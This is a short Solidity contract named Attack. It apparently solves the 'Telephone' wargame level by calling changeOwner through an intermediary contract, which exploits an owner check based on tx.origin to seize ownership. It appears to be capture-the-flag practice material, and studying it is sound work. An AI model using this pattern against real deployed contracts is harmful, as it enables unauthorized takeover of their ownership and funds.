// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "../src/Telephone.sol";

contract Attack {
    Telephone public telephone;

    constructor(Telephone _telephone) public {
        telephone = _telephone;
    }

    function attack(address _newOwner) public {
        telephone.changeOwner(_newOwner);
    }
}